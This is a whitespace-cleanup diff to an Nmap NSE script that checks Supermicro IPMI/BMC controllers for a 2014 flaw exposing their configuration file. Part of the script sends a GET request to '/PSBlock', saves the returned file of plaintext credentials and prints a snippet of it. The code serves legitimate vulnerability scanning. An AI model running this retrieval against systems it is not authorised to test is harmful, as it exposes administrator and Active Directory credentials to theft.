@@ -10,24 +10,24 @@ References:
 
 ---
 -- @usage nmap -p49152 --script supermicro-ipmi-conf <target>
--- 
+--
 -- @output
 -- PORT      STATE SERVICE REASON
 -- 49152/tcp open  unknown syn-ack
--- | supermicro-ipmi-conf: 
+-- | supermicro-ipmi-conf:
 -- |   VULNERABLE:
 -- |   Supermicro IPMI/BMC configuration file disclosure
 -- |     State: VULNERABLE (Exploitable)
 -- |     Description:
 -- |       Some Supermicro IPMI/BMC controllers allow attackers to download
--- |        a configuration file containing plain text user credentials. This credentials may be used to log in to the administrative interface and the 
+-- |        a configuration file containing plain text user credentials. This credentials may be used to log in to the administrative interface and the
 -- |       network's Active Directory.
 -- |     Disclosure date: 2014-06-19
 -- |     Extra information:
 -- |       Snippet from configuration file:
 -- |   .............31spring.............\x14..............\x01\x01\x01.\x01......\x01ADMIN...........ThIsIsApAsSwOrD.............T.T............\x01\x01\x01.\x01......\x01ipmi............w00t!.............\x14.............
 -- |   Configuration file saved to 'xxx.xxx.xxx.xxx_bmc.conf'
--- |   
+-- |
 -- |     References:
 -- |_      http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/
 --
@@ -62,20 +62,20 @@ end
 action = function(host, port)
   local fw = stdnse.get_script_args(SCRIPT_NAME..".out") or host.ip.."_bmc.conf"
   local vuln = {
-       title = 'Supermicro IPMI/BMC configuration file disclosure',
-       state = vulns.STATE.NOT_VULN, 
-       description = [[
+    title = 'Supermicro IPMI/BMC configuration file disclosure',
+    state = vulns.STATE.NOT_VULN,
+    description = [[
 Some Supermicro IPMI/BMC controllers allow attackers to download
- a configuration file containing plain text user credentials. This credentials may be used to log in to the administrative interface and the 
+ a configuration file containing plain text user credentials. This credentials may be used to log in to the administrative interface and the
 network's Active Directory.]],
-       references = {
-           'http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/',
-       },
-       dates = {
-           disclosure = {year = '2014', month = '06', day = '19'},
-       },
-     }
-     
+    references = {
+      'http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/',
+    },
+    dates = {
+      disclosure = {year = '2014', month = '06', day = '19'},
+    },
+  }
+
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
   local open_session = http.get(host.ip, port, "/PSBlock")
   if open_session and open_session.status ==200 and string.len(open_session.body)>200 then
@@ -88,7 +88,7 @@ network's Active Directory.]],
     else
       extra_info = ''
       stdnse.debug(1, "Error saving configuration file to '%s': %s\n", fw, err)
-    end	
+    end
 
     vuln.extra_info = "Snippet from configuration file:\n"..string.sub(s, 25, 200)..extra_info
   end
